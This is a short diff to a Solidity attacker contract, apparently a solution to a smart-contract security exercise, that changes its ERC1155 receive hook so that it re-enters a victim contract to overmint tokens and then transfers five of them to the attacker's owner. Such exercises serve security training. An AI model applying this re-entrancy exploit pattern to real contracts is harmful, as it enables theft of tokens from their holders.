@@ -40,8 +40,8 @@ contract Overmint1_ERC1155_Attacker is ERC1155Holder {
         }
         if (Overmint1_ERC1155(i_victim).success(address(this), 0)) {
             Overmint1_ERC1155(i_victim).setApprovalForAll(i_owner, true);
+            Overmint1_ERC1155(i_victim).safeTransferFrom(address(this), i_owner, 0, 5, "0x00");
         }
-        Overmint1_ERC1155(i_victim).setApprovalForAll(i_owner, true);
         return this.onERC1155Received.selector;
     }
 
